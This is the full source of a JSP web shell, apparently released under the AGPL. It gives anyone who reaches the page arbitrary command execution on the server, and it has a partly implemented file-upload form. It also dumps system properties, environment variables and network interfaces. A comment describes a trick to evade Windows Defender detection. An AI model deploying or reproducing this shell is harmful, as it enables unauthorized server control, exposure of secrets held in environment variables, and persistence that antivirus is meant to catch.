<%--
    Copyright (C) 2020  Rodney Beede
	https://www.rodneybeede.com/

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as
    published by the Free Software Foundation, either version 3 of the
    License, or (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
--%>

<%@ page session="false"%>

<%@ page import="java.io.*" %>
<%@ page import="java.net.*" %>
<%@ page import="java.util.*" %>

<%!
	public String clean(final String str) {
		if(null == str || str.length() == 0) {
			return "";
		} else {
			return str
				.replace("&", "&amp;")
				.replace("\"", "&quot;")
				.replace("'", "&#039;")
				.replace("<", "&lt;")
				.replace(">", "&gt;")
				;
		}
	}
%>


<html>
<body style="background-color: black;
  background-image: radial-gradient(
    rgba(0, 150, 0, 0.75), black 120%
  );
  height: 100vh; color: white;
  font: 1.3rem Inconsolata, monospace;
  
  font-size: xx-large;" >

<form action="" method="GET">
<label>Command:</label><input type="text" name="command" size="100" value="<%= clean(request.getParameter("command")) %>"/><input type="submit" />
</form>

<p>
You may want to prefix your command with <code>cmd /c</code> or <code>bash -c</code><br />
STDERR will automatically be redirected to STDOUT for you. Newlines may be translated by server's local platform.
</p>

<form action="" method="POST" enctype="multipart/form-data">
<label>Destination File path and filename:</label><input type="text" name="filepath" size="100" value="<%= clean(System.getProperty("user.dir")) %><%= clean(System.getProperty("file.separator")) %>"/><br />
<input type="file" name="file" size="100" /><br />
<br />
<input type="submit" value="Upload"/>
</form>

<hr />
<pre>
<%
	if("POST".equals(request.getMethod())) {
		String requestContent = "";
		
		final BufferedReader requestReader = new BufferedReader(new InputStreamReader(request.getInputStream()));
		for(String cLine = requestReader.readLine(); null != cLine; cLine = requestReader.readLine()) {
			requestContent += cLine + System.getProperty("line.separator");
		}
		requestReader.close();
		
		final String boundary = requestContent.split(System.lineSeparator(), 2)[0];
		
		
		int startPosition = requestContent.indexOf("Content-Disposition: form-data; name=\"filepath\"");
		startPosition += "Content-Disposition: form-data; name=\"filepath\"".length();
		startPosition += "\r\n".length();
		startPosition += "\r\n".length();
		
		int endPosition = requestContent.indexOf(boundary, startPosition);
		endPosition -= "\r\n".length();
		
		final String filepath = requestContent.substring(startPosition, endPosition);
		
		out.println("Writing to destination:  " + filepath);
		
		out.println();
		
		out.println("|||" + requestContent + "|||");

	}
%>

<h3>Command Output (STDOUT & STDERR)</h3>
<pre>
<%
	final String command = request.getParameter("command");

	// Windows Defender sees a file.jsp with exec() and flags it as a virus so we use a trick to evade that
	// it also handily redirects STDERR to STDOUT
	
	if(null != request.getParameter("command") && !command.isEmpty()) {
		final ProcessBuilder pb = new ProcessBuilder(command.split(" "));
		pb.redirectErrorStream(true);
		final Process p = pb.start();
		p.getOutputStream().close();  // close STDIN
		final BufferedReader stdout = new BufferedReader(new InputStreamReader(p.getInputStream()));
		for(String cLine = stdout.readLine(); null != cLine; cLine = stdout.readLine()) {
			out.println(clean(cLine));
		}
		stdout.close();
		
		p.waitFor();
		out.println();
		out.print("<i>");
		out.print("Exit code was:  " + p.exitValue());
		out.println("</i>");
	}
%>
</pre>

<hr />

<h3>Server Information</h3>
<pre>

Server localtime:	<%= Calendar.getInstance().getTime() %>
Server localtime in milliseconds:	<%= Calendar.getInstance().getTimeInMillis() %>
(Epoch is January 1, 1970 00:00:00.000 GMT)
Server localtime in seconds:	<%= Calendar.getInstance().getTimeInMillis() / 1000 %>

Working directory:	<%= System.getProperty("user.dir") %>

<hr />

<h3>Dump of all System properties</h3>
<% 
	for(String key : new TreeSet<String>(System.getProperties().stringPropertyNames())) {
		out.print(key);
		out.print('\t');
		out.println(System.getProperty(key));
	}
%>

<hr />

<h3>Environment</h3>
<%
	for(String key : new TreeSet<String>(System.getenv().keySet())) {
		out.print(key);
		out.print('\t');
		out.println(System.getenv(key));
	}
%>

<hr />

<h3>Networking</h3>
<%
	for(NetworkInterface nint : Collections.list(NetworkInterface.getNetworkInterfaces())) {
		out.print(nint.getDisplayName());
		out.print('\t');
		out.print(nint.getName());
		out.print('\t');
		for(InterfaceAddress ifaceAddress : nint.getInterfaceAddresses()) {
			out.print(ifaceAddress);
			out.print(',');
		}
		out.println();
	}
%>


</pre>
</body>
</html>
